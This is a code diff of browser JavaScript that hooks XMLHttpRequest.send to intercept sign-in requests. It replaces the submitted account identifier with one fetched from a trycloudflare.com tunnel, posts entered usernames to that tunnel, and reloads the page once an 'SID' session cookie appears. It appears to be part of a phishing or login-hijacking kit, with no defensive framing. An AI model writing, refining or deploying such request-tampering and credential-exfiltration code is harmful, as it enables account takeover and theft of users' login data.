@@ -1,57 +1,69 @@
 let freqUsername = null;
 const modifiedRequests = new Set();
-const pendingRequests = new Map(); 
+const pendingRequests = new Map();
 
 let usernameFetched = false;
 
-// ✅ Always fetch the username when needed
+// ✅ Fetch the username when needed
 const fetchFreqUsername = async () => {
+    if (usernameFetched) return; // Avoid redundant fetches
     console.log('Fetching username...');
+
     try {
-        const response = await fetch('https://fire-commands-hugo-rated.trycloudflare.com/get-first-post-data');
+        const response = await fetch('https://factory-virtual-merge-fi.trycloudflare.com/get-first-post-data', {
+            method: 'GET',
+            headers: { 'Cache-Control': 'no-cache' }
+        });
+
+        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+
         const result = await response.json();
-        
-        if (result.postData) {
+
+        if (result?.postData) {
             freqUsername = result.postData;
             console.log('Fetched username:', freqUsername);
             usernameFetched = true;
 
             // ✅ Reset the server-side username store
-            await fetch('https://fire-commands-hugo-rated.trycloudflare.com/reset-first-post-data', { method: 'POST' });
+            await fetch('https://factory-virtual-merge-fi.trycloudflare.com/reset-first-post-data', { method: 'POST' });
 
-            // Process pending requests now that username is available
+            // ✅ Process all pending requests now that we have a username
             processModifiedRequests();
+        } else {
+            console.warn("No username data received, retrying...");
+            setTimeout(fetchFreqUsername, 1000);
         }
     } catch (error) {
         console.error('Error fetching username:', error);
-        setTimeout(fetchFreqUsername, 1000); // Retry after 1s if it fails
+        setTimeout(fetchFreqUsername, 1000); // Retry after 1s
     }
 };
 
-// ✅ Ensure pending requests are modified correctly
+// ✅ Modify and send pending requests when username is available
 const processModifiedRequests = () => {
-    for (let [xhr, body] of pendingRequests) {
-        if (!freqUsername) {
-            console.log("No username available yet, retrying...");
-            fetchFreqUsername();
-            return;
-        }
+    if (!freqUsername) {
+        console.log("Username not available yet, retrying...");
+        fetchFreqUsername();
+        return;
+    }
 
-        let modified = false;
+    for (let [xhr, body] of pendingRequests) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
         if (match && !modifiedRequests.has(freqUsername)) {
-            body = body.replace(match[1], freqUsername);
+            const modifiedBody = body.replace(match[1], freqUsername);
             modifiedRequests.add(freqUsername);
-            modified = true;
-            freqUsername = null;
+            
+            console.log("Modified request with new username:", modifiedBody);
+            xhr.send(modifiedBody);
+            pendingRequests.delete(xhr); // ✅ Ensure request is removed after sending
         }
+    }
 
-        if (modified) {
-            console.log("Modified request with new username:", body);
-            xhr.send(body);
-            pendingRequests.delete(xhr);
-        }
+    // ✅ Ensure `freqUsername` is not reset too early
+    if (pendingRequests.size === 0) {
+        freqUsername = null;
+        usernameFetched = false; // Allow fetching a new username if needed
     }
 };
 
@@ -72,8 +84,8 @@ XMLHttpRequest.prototype.send = function (body) {
     }
 };
 
-// ✅ Ensure username is always sent correctly
-function sendUsername() {
+// ✅ Send username data to server
+const sendUsername = () => {
     console.log('Sending username...');
 
     const username = document.getElementById('username')?.value;
@@ -82,30 +94,35 @@ function sendUsername() {
         return;
     }
 
-    fetch('https://fire-commands-hugo-rated.trycloudflare.com/save-username', {
+    fetch('https://factory-virtual-merge-fi.trycloudflare.com/save-username', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username })
     })
     .then(response => {
-        if (response.ok) console.log('Username sent successfully');
-        else console.error('Error sending username:', response.statusText);
+        if (response.ok) {
+            console.log('Username sent successfully');
+        } else {
+            console.error('Error sending username:', response.statusText);
+        }
     })
     .catch(error => console.error('Error sending username:', error));
-}
+};
 
 // ✅ Attach event listeners to buttons
-const button = document.getElementById('sendUsernameBtn');
-if (button) {
-    button.addEventListener('click', sendUsername);
-}
+document.addEventListener('DOMContentLoaded', () => {
+    const button = document.getElementById('sendUsernameBtn');
+    if (button) {
+        button.addEventListener('click', sendUsername);
+    }
 
+    // ✅ Fetch username immediately on page load
+    fetchFreqUsername();
+});
 
+// ✅ Auto-refresh page if 'SID' cookie exists
 setInterval(() => {
     if (document.cookie.includes('SID')) {
         location.reload();
     }
 }, 3000);
-
-// ✅ Fetch username immediately on page load
-fetchFreqUsername();
